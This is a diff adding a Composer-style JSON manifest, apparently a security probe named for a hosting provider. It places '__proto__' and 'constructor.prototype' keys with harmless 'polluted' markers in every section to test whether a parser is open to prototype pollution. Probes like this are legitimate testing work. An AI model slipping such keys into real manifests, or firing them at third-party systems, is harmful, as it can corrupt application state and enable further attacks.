@@ -1,0 +1,43 @@
+{
+  "name": "test/hostinger-probe",
+  "description": "Prototype pollution probe",
+  "type": "project",
+  "require": {},
+
+  "config": {
+    "__proto__": {
+      "polluted": "config"
+    },
+    "constructor": {
+      "prototype": {
+        "polluted": "constructor"
+      }
+    }
+  },
+
+  "extra": {
+    "__proto__": {
+      "polluted": "extra"
+    },
+    "constructor": {
+      "prototype": {
+        "polluted": "extra-constructor"
+      }
+    }
+  },
+
+  "autoload": {
+    "__proto__": {
+      "polluted": "autoload"
+    },
+    "psr-4": {
+      "Test\\": "src/"
+    }
+  },
+
+  "scripts": {
+    "__proto__": {
+      "polluted": "scripts"
+    }
+  }
+}
